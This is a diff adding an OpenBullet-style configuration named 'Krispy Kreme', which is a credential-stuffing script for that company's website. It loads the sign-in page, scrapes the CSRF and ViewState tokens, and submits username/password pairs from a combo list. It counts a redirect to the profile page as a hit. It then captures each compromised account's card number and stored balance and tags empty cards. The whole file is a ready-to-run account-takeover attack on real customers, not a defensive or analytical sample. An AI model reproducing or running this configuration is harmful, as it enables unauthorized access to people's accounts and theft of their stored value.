@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "Krispy Kreme",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-10T04:30:29.5301862+06:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.0",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www1.krispykreme.com/account/sign-in" 
+  
+  HEADER "Host: www.krispykreme.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.krispykreme.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.krispykreme.com/account/sign-in" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "CMSCsrfToken\" value=\"" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "None" 
+
+#CMSCsrfToken_ PARSE "<SOURCE>" LR "CMSCsrfToken\" value=\"" "\"" -> VAR "CMSCsrfToken_" 
+
+#VIEWSTATE_ PARSE "<SOURCE>" LR "VIEWSTATE\" value=\"" "\"" -> VAR "VIEWSTATE_" 
+
+#EVENTVALIDATION_ PARSE "<SOURCE>" LR "EVENTVALIDATION\" value=\"" "\"" -> VAR "EVENTVALIDATION_" 
+
+#CMSCsrfToken FUNCTION URLEncode "<CMSCsrfToken_>" -> VAR "CMSCsrfToken" 
+
+#VIEWSTATE FUNCTION URLEncode "<VIEWSTATE_>" -> VAR "VIEWSTATE" 
+
+#EVENTVALIDATION FUNCTION URLEncode "<EVENTVALIDATION_>" -> VAR "EVENTVALIDATION" 
+
+REQUEST POST "https://www1.krispykreme.com/account/sign-in" 
+  CONTENT "__CMSCsrfToken=<CMSCsrfToken>&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=<VIEWSTATE>&lng=en-US&__VIEWSTATEGENERATOR=4DBC0E4B&__EVENTVALIDATION=<EVENTVALIDATION>&ctl00%24plcMain%24hfFacebookEmail=&ctl00%24plcMain%24hfFacebookToken=&ctl00%24plcMain%24txtUserName=<USER>&ctl00%24plcMain%24txtPassword=<PASS>&ctl00%24plcMain%24btnSubmit=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.krispykreme.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.krispykreme.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.krispykreme.com/account/sign-in" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "/account/profile" 
+
+REQUEST GET "https://www1.krispykreme.com/account/my-card" 
+  
+  HEADER "Host: www.krispykreme.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.krispykreme.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.krispykreme.com/account/sign-in" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#CARD PARSE "<SOURCE>" LR "alt=\"Card #" "\" />" CreateEmpty=FALSE -> CAP "CARD#" 
+
+#balance_ PARSE "<SOURCE>" LR "<div class=\"balance\">" "</div>" -> VAR "balance_" 
+
+#BALANCE PARSE "<balance_>" LR "<strong>" "</strong>" CreateEmpty=FALSE -> CAP "BALANCE" 
+
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "$0.00</strong" 
+
